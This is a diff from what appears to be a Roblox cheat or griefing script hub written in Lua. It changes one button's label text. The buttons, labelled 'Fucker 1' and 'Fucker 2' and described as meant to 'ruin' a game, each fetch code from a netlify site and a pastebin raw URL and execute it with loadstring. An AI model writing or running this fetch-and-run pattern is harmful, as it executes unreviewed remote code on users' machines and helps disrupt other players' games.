@@ -847,6 +847,6 @@ local Section = Tab:NewSection("No guys i can't explain myself")
 Section:NewButton("Fucker 1", "Lets ruin ts game into two pieces", function()
     loadstring(game:HttpGet('https://syrexhub.netlify.app/execution'))()
 end)
-Section:NewButton("Fucker 2", "ButtonInfo", function()
+Section:NewButton("Fucker 2", "XD", function()
     loadstring(game:HttpGet("https://pastebin.com/raw/xte3FGDv"))();
 end)
